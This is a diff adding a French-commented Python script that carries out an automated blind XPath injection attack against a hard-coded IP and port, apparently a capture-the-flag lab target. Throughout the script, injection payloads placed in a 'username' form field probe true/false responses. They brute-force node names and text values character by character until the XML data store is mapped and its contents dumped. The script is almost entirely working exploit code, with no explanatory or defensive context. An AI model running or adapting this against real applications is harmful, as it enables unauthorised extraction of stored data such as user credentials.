@@ -1,0 +1,100 @@
+import requests
+
+# Configuration de l'URL et des messages
+url = "http://94.237.63.221:32789/index.php"  # L'URL cible
+message_ok = "successfully"  # Message indiquant une condition vraie
+message_erreur = "exist"  # Message indiquant une condition fausse
+caracteres_possibles = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_=+[]{};:',.<>/?`~"
+
+# Fonction pour tester l'existence d'un nœud à une profondeur donnée avec une structure spécifique
+def test_noeud_xpath(xpath):
+    payload = f"invalid' or count({xpath}) = 1 and '1'='1"
+    data = {
+        "username": payload,
+        "msg": "zdzd"
+    }
+    response = requests.post(url, data=data)
+    return message_ok in response.text
+
+# Fonction pour bruteforcer le nom d'un nœud à un chemin XPath donné
+def brute_force_nom_noeud(xpath):
+    nom_noeud = ""
+    index = 1
+    while True:
+        caractere_trouve = False
+        for caractere in caracteres_possibles:
+            payload = f"invalid' or substring(name({xpath}),{index},1)='{caractere}' and '1'='1"
+            data = {
+                "username": payload,
+                "msg": "zdzd"
+            }
+            response = requests.post(url, data=data)
+            if message_ok in response.text:
+                nom_noeud += caractere
+                print(f"Caractère trouvé pour {xpath}: {caractere}")
+                caractere_trouve = True
+                break
+        if not caractere_trouve:
+            break  # Fin de la chaîne
+        index += 1
+    return nom_noeud
+
+# Fonction pour bruteforcer la valeur d'un nœud lorsque celui-ci est une feuille
+def brute_force_valeur_noeud(xpath):
+    valeur_noeud = ""
+    index = 1
+    while True:
+        caractere_trouve = False
+        for caractere in caracteres_possibles:
+            payload = f"invalid' or substring({xpath}/text(),{index},1)='{caractere}' and '1'='1"
+            data = {
+                "username": payload,
+                "msg": "zdzd"
+            }
+            response = requests.post(url, data=data)
+            if message_ok in response.text:
+                valeur_noeud += caractere
+                print(f"Caractère trouvé pour la valeur de {xpath}: {caractere}")
+                caractere_trouve = True
+                break
+        if not caractere_trouve:
+            break  # Fin de la valeur
+        index += 1
+    return valeur_noeud
+
+# Fonction principale pour explorer la structure XML et extraire noms et valeurs
+def explorer_structure_et_valeurs(profondeur_max, largeur_max):
+    structure = {}
+
+    def explorer_niveau(profondeur, chemin):
+        if profondeur > profondeur_max:
+            return
+
+        for i in range(1, largeur_max + 1):
+            xpath = chemin + f"/*[{i}]"
+            if test_noeud_xpath(xpath):
+                print(f"Nœud trouvé à {xpath}")
+                # Bruteforce du nom du nœud
+                nom_noeud = brute_force_nom_noeud(xpath)
+                structure[xpath] = {"nom": nom_noeud, "valeur": None}
+                print(f"Nom du nœud pour {xpath}: {nom_noeud}")
+                
+                # Tester si ce nœud a des enfants
+                if not test_noeud_xpath(xpath + "/*[1]"):
+                    # Si le nœud n'a pas d'enfant, bruteforcer sa valeur
+                    valeur_noeud = brute_force_valeur_noeud(xpath)
+                    structure[xpath]["valeur"] = valeur_noeud
+                    print(f"Valeur du nœud pour {xpath}: {valeur_noeud}")
+                else:
+                    # Si le nœud a des enfants, continuer l'exploration
+                    explorer_niveau(profondeur + 1, xpath)
+            else:
+                print(f"Aucun nœud à {xpath}")
+
+    # Démarrer à partir de la racine
+    explorer_niveau(1, "/*[1]")
+    return structure
+
+# Exemple d'utilisation : explorer jusqu'à 4 niveaux et 5 nœuds par niveau
+structure_xml = explorer_structure_et_valeurs(4, 5)
+print("Structure XML et noms/valeurs des nœuds:", structure_xml)
